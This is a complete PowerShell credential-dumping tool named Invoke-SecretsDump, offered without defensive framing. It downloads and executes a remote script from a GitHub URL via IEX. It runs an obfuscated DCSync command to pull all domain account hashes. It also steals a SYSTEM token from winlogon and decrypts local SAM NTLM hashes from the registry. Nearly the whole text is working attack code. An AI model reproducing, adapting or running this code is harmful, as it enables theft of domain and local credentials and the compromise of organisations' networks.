Function Invoke-SecretsDump {
    param (
    [string]$Domain = $env:USERDNSDOMAIN,
    [switch]$NoComputerHashes
)

IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1')

$Command = '"lsaDUMp::dCsyNc /DOmaIN:' + $Domain + ' /alL /cSv"'
$output = Invoke-Pandemonium -Command $Command

$lines = $output -split '\r?\n'

$Data = $lines | ForEach-Object {
    $columns = $_ -split "`t"
    $user = $columns[1]
    $hash = $columns[2]
    if ($user -and $hash) {
        "$user::aad3b435b51404eeaad3b435b51404ee:$hash:::"
    }
}

Write-Output ""
Write-Output "[*] Dumping local SAM hashes (uid:lmhash:nthash)"
function DumpSAM{$ErrorActionPreference = "SilentlyContinue"
try{&{[void][impsys.win32]}}catch{Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;namespace impsys{public class win32{[DllImport(`"kernel32.dll`",SetLastError=true)]public static extern bool CloseHandle(IntPtr hHandle);[DllImport(`"kernel32.dll`",SetLastError=true)]public static extern IntPtr OpenProcess(uint processAccess,bool bInheritHandle,int processId);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool OpenProcessToken(IntPtr ProcessHandle,uint DesiredAccess,out IntPtr TokenHandle);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool DuplicateTokenEx(IntPtr hExistingToken,uint dwDesiredAccess,IntPtr lpTokenAttributes,uint ImpersonationLevel,uint TokenType,out IntPtr phNewToken);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool RevertToSelf();}}"}
function IAS{[CmdletBinding()]param([Parameter(Mandatory=$true,Position=0)][scriptblock]$Process,[Parameter(Position=1)][object[]]$ArgumentList);$a=GPS -Name "winlogon"|Select -First 1 -ExpandProperty Id;if(($b=[impsys.win32]::OpenProcess(0x400,$true,[Int32]$a)) -eq [IntPtr]::Zero){$c=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}$d=[IntPtr]::Zero;if(-not [impsys.win32]::OpenProcessToken($b,0x0E,[ref]$d)){$c=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}$f=[IntPtr]::Zero;if(-not [impsys.win32]::DuplicateTokenEx($d,0x02000000,[IntPtr]::Zero,0x02,0x01,[ref]$f)){$c=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}try{if(-not [impsys.win32]::ImpersonateLoggedOnUser($f)){$c=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}& $Process @ArgumentList}finally{if(-not [impsys.win32]::RevertToSelf()){$c=[Runtime.InteropServices.Marshal]::GetLastWin32Error()}}}
try{&{[void][ntlmx.win32]}}catch{Add-Type -TypeDefinition "using System;using System.Text;using System.Runtime.InteropServices;namespace ntlmx{public class win32{[DllImport(`"advapi32.dll`",SetLastError=true,CharSet=CharSet.Auto)]public static extern int RegOpenKeyEx(IntPtr hKey,string subKey,int ulOptions,int samDesired,out IntPtr hkResult);[DllImport(`"advapi32.dll`",SetLastError=true,CharSet=CharSet.Auto)]public static extern int RegQueryInfoKey(IntPtr hkey,StringBuilder lpClass,ref int lpcbClass,int lpReserved,out int lpcSubKeys,out int lpcbMaxSubKeyLen,out int lpcbMaxClassLen,out int lpcValues,out int lpcbMaxValueNameLen,out int lpcbMaxValueLen,out int lpcbSecurityDescriptor,IntPtr lpftLastWriteTime);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern int RegCloseKey(IntPtr hKey);}}"}
function GNLPH{GCI "HKLM:SAM\SAM\Domains\Account\Users"|?{$_.PSChildName -match "^[0-9A-F]{8}$"}|%{$ae=$_.PSChildName;$v=(Get-ItemProperty "HKLM:SAM\SAM\Domains\Account\Users\$ae" -Name V).V;$f=(Get-ItemProperty "HKLM:SAM\SAM\Domains\Account" -Name F).F;$xc=-join(&{"JD","Skew1","GBG","Data"|%{$ou=[IntPtr]::Zero;if([ntlmx.win32]::RegOpenKeyEx(0x80000002,"SYSTEM\CurrentControlSet\Control\Lsa\$_",0x0,0x19,[ref]$ou)){$e=[Runtime.InteropServices.Marshal]::GetLastWin32Error();throw [ComponentModel.Win32Exception]$e}$lp=New-Object Text.StringBuilder 1024;[int]$oz=1024;if([ntlmx.win32]::RegQueryInfoKey($ou,$lp,[ref]$oz,0x0,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[IntPtr]::Zero)){$e=[Runtime.InteropServices.Marshal]::GetLastWin32Error();throw [ComponentModel.Win32Exception]$e}[void][ntlmx.win32]::RegCloseKey($ou);$lp.ToString()}});$md5=[Security.Cryptography.MD5]::Create();$q=[Security.Cryptography.Aes]::Create();$q.Mode=[Security.Cryptography.CipherMode]::CBC;$q.Padding=[Security.Cryptography.PaddingMode]::None;$q.KeySize=128;$k=[Security.Cryptography.DES]::Create();$k.Mode=[Security.Cryptography.CipherMode]::ECB;$k.Padding=[Security.Cryptography.PaddingMode]::None;$uu=[BitConverter]::ToInt32($v,0x0C)+0xCC;$len=[BitConverter]::ToInt32($v,0x10);$username=[Text.Encoding]::Unicode.GetString($v,$uu,$len);$uu=[Bitconverter]::ToInt32($v,0xA8)+0xCC;$bk=8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7|%{[Convert]::ToByte("$($xc[$_*2])$($xc[$_*2+1])",16)};switch($v[0xAC]){0x38{$enc_syskey=$f[0x88..0x97];$enc_syskey_iv=$f[0x78..0x87];$enc_syskey_key=$bk;$syskey=$q.CreateDecryptor($enc_syskey_key,$enc_syskey_iv).TransformFinalBlock($enc_syskey,0,16);$enc_ntlm=$v[($uu+24)..($uu+24+0x0F)];$enc_ntlm_iv=$v[($uu+8)..($uu+23)];$enc_ntlm_key=$syskey;$enc_ntlm=$q.CreateDecryptor($enc_ntlm_key,$enc_ntlm_iv).TransformFinalBlock($enc_ntlm,0,16)}0x14{$enc_syskey=$f[0x80..0x8f];$enc_syskey_key=$md5.ComputeHash($f[0x70..0x7f]+[Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0")+$bk+[Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0"));$syskey=rc4 $enc_syskey $enc_syskey_key;$enc_ntlm=$v[($uu+4)..($uu+4+0x0F)];$enc_ntlm_key=$md5.ComputeHash($syskey+(3,2,1,0|%{[Convert]::ToByte("$($ae[$_*2])$($ae[$_*2+1])",16)})+[Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0"));$enc_ntlm=rc4 $enc_ntlm $enc_ntlm_key}default{New-Object PSObject -Property @{Username=$username;RID=[int]"0x$ae";NTLM="31D6CFE0D16AE931B73C59D7E0C089C0"}}}$k_str_1=3,2,1,0,3,2,1|%{[Convert]::ToByte("$($ae[$_*2])$($ae[$_*2+1])",16)};$k_str_2=0,3,2,1,0,3,2|%{[Convert]::ToByte("$($ae[$_*2])$($ae[$_*2+1])",16)};$k_key_1=str_to_key $k_str_1;$k_key_2=str_to_key $k_str_2;$ntlm_1=$k.CreateDecryptor($k_key_1,$k_key_1).TransformFinalBlock($enc_ntlm,0,8);$ntlm_2=$k.CreateDecryptor($k_key_2,$k_key_2).TransformFinalBlock($enc_ntlm,8,8);$ntlm=[BitConverter]::ToString($ntlm_1+$ntlm_2)-replace '-','';New-Object PSObject -Property @{Username=$username;RID=[int]"0x$ae";NTLM=$ntlm}}}
function rc4($d,$k){$r=$d;$s,$k=@(0..255),@($k*256);$j=0;0..255|%{$j=($j+$s[$_]+$k[$_])%256;$s[$_],$s[$j]=$s[$j],$s[$_]}
$i=$j=0;0..($r.Length-1)|%{$i=($i+1)%256;$j=($j+$s[$i])%256;$s[$i],$s[$j]=$s[$j],$s[$i];$t=($s[$i]+$s[$j])%256;$r[$_]=$r[$_]-bxor$s[$t]};$r}
function str_to_key($s) {
$odd_parity=@(1,1,2,2,4,4,7,7,8,8,11,11,13,13,14,14,16,16,19,19,21,21,22,22,25,25,26,26,28,28,31,31,32,32,35,35,37,37,38,38,41,41,42,42,44,44,47,47,49,49,50,50,52,52,55,55,56,56,59,59,61,61,62,62,64,64,67,67,69,69,70,70,73,73,74,74,76,76,79,79,81,81,82,82,84,84,87,87,88,88,91,91,93,93,94,94,97,97,98,98,100,100,103,103,104,104,107,107,109,109,110,110,112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254);$0=@();$0+=bitshift $s[0]-1;$0+=(bitshift ($s[0]-band 0x01) 6)-bor(bitshift $s[1]-2);$0+=(bitshift ($s[1]-band 0x03) 5)-bor(bitshift $s[2]-3);$0+=(bitshift ($s[2]-band 0x07) 4)-bor(bitshift $s[3]-4);$0+=(bitshift ($s[3]-band 0x0F) 3)-bor(bitshift $s[4]-5);$0+=(bitshift ($s[4]-band 0x1F) 2)-bor(bitshift $s[5]-6);$0+=(bitshift ($s[5]-band 0x3F) 1)-bor(bitshift $s[6]-7);$0+=$s[6]-band 0x7F;$0[0]=$odd_parity[(bitshift $0[0] 1)];$0[1]=$odd_parity[(bitshift $0[1] 1)];$0[2]=$odd_parity[(bitshift $0[2] 1)];$0[3]=$odd_parity[(bitshift $0[3] 1)];$0[4]=$odd_parity[(bitshift $0[4] 1)];$0[5]=$odd_parity[(bitshift $0[5] 1)];$0[6]=$odd_parity[(bitshift $0[6] 1)];$0[7]=$odd_parity[(bitshift $0[7] 1)];$0}
function bitshift($x, $c){return [math]::Floor($x * [math]::Pow(2, $c))}
$users=IAS -Process {GNLPH};$excludedUsernames=@("Guest","DefaultAccount","WDAGUtilityAccount");foreach($user in $users){if($user.Username-notin$excludedUsernames){$output="$($user.Username):$($user.RID):aad3b435b51404eeaad3b435b51404ee:$($user.NTLM.ToLower()):::";$Output}}}
DumpSAM

Write-Output ""
Write-Output "[*] Dumping User Hashes (uid:rid:lmhash:nthash)"



$Data | ForEach-Object {
    if ($_ -notlike "*$*") {
        Write-Output $_
    }
}

Write-Output ""

if (!$NoComputerHashes) {
    Write-Output "[*] Dumping Computer Hashes (uid:rid:lmhash:nthash)"
    $Data | ForEach-Object {
        if ($_ -like "*$*") {
            Write-Output $_
            
            }
        }
    }
}
